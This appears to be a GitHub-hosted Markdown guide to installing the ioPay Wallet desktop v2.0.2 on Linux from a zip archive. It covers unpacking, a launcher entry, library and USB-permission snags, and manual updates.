![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Installing ioPay Wallet Desktop on Linux

The current release is **v2.0.2, published 19 November 2026**, and the Linux download is an archive:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

**`iopay-wallet-desktop-linux-v2.0.2.zip` - 79.4 MB**

That is worth stating plainly, because it changes the install: **there is no `.deb`, no `.rpm`, no `.AppImage` and no Flatpak or Snap** for this build. You unpack it and run it. Any page offering you a package for ioPay Wallet Desktop is not serving this release.

## Before you start

- A 64-bit Linux desktop with a graphical session - this is a desktop app, not a CLI.
- About **250 MB** free, for the archive and the unpacked app.
- The release page open in a browser.
- The zip utility present (`unzip` is installed on most desktops; if not, your package manager has it).
- Your backup decision made. Read [backing up your seed phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) before creating a wallet.

## Install

1. **Download the zip** from the release assets - `iopay-wallet-desktop-linux-v2.0.2.zip`. Check it carries both `linux` and `v2.0.2`.
2. **Unpack it** somewhere you control, for example:

   ```
   mkdir -p ~/apps/iopay && unzip iopay-wallet-desktop-linux-v2.0.2.zip -d ~/apps/iopay
   ```

3. **Find the executable** inside the unpacked folder. On some builds the binary lands without its execute bit, because zip archives do not always preserve permissions:

   ```
   chmod +x ~/apps/iopay/<the-app-binary>
   ```

4. **Run it** from a terminal the first time, so you can read any missing-library error instead of watching a window fail to appear.
5. **Set the app lock on first run** - a PIN, with biometric unlock if your desktop provides it.
6. **Create or import an account**, then confirm both the `io1...` and `0x...` addresses appear. Restoring an existing wallet? [Use the restore guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/restoring-iopay-wallet-from-a-seed-phrase.md).

There is no system-wide installer, so the app is only where you put it. If you want it in your application menu, create a `.desktop` entry pointing at that binary - that is your distribution's convention, not something the release ships.

## The Linux-specific snags

**"error while loading shared libraries".** The build is a desktop app with system library dependencies; run it from a terminal and read the first missing library name. Installing that library from your distribution's repositories normally fixes it. If the missing library is a version your distribution does not carry, you are on a base the release was not built against - a newer or older long-term-support release is the usual fix.

**Wrong architecture.** The release ships one Linux archive and does not label it by CPU architecture. A 64-bit desktop is the assumption; ARM desktops are not covered by anything published with the release, so treat them as untested.

**Sandboxed formats (Flatpak, Snap, AppImage).** None are published. If you wrap the app yourself in one, the wallet's keychain and USB hardware-wallet access may not work inside the sandbox - Ledger and Trezor signing over USB needs device access that sandboxes often restrict.

**Auto-update under a manual layout.** The app supports auto-update, but an unpacked app in a folder you own can be replaced by hand just as easily: download the newer zip, unpack over the old folder, keep your data directory. Do not delete the data directory - that is where accounts live.

## First-run checklist

- Phrase written down, offline, separate from the machine.
- One successful test restore from that phrase.
- The app reports **v2.0.2**.
- You know whether the sender will use `io1...` or `0x...`.

## If the app cannot reach the chain

An install that launches but never syncs is a network problem, not an install problem: check DNS and any firewall or VPN, then [ioPay Wallet not connecting to the network](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md). If it connects but balances look wrong, that is [a different fix](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md).

Other platforms: [Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) - [macOS](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-installation-guide-for-macos.md).

## Turning the folder into something you can launch

An unpacked archive has no menu entry, so the app lives at a path you have to remember. One small file fixes that. Create `~/.local/share/applications/iopay.desktop` with the absolute path to the binary you made executable:

```
[Desktop Entry]
Type=Application
Name=ioPay Wallet
Exec=/home/<you>/apps/iopay/<the-app-binary>
Terminal=false
```

Save it, and the app appears in your launcher with the rest of your applications. Keep the path absolute: a relative one works until the day you launch it from somewhere else.

## Where the data directory sits

Unpacking a newer zip over the old folder is safe because accounts live in the data directory, not among the unpacked files. That is the same reason a manual update is nothing more than replacing the folder and keeping the data: the archive carries the application, and the data carries the wallet.

Which means the one thing never to delete when tidying up is that data directory. Removing the unpacked folder reclaims the app; removing the data directory removes the accounts, and only the phrase brings them back.

## Hardware signing under Linux

Ledger and Trezor signing runs over USB (F011, F028), and desktop Linux is the platform where that is most likely to need a permission rule: the device node is owned by root until a udev rule says otherwise, so the device can be present and still unusable by the app. If the wallet reports no device, check the permissions before assuming the cable.


## Updating without a package manager

There is no repository to subscribe to, so an update is a download and a replacement: fetch the newer zip, unpack it over the folder you already use, and leave the data directory alone. The application files are replaced; the wallet is not touched.

If you created a `.desktop` entry, check that its `Exec` path still points at the binary you actually run. Run once from a terminal after the replacement so a missing library shows up as a message rather than a window that never appears.

---

*The download is the v2.0.2 release asset. This guide describes the archive the release carries - a zip - and makes no claim about distribution packages, because none exist.*
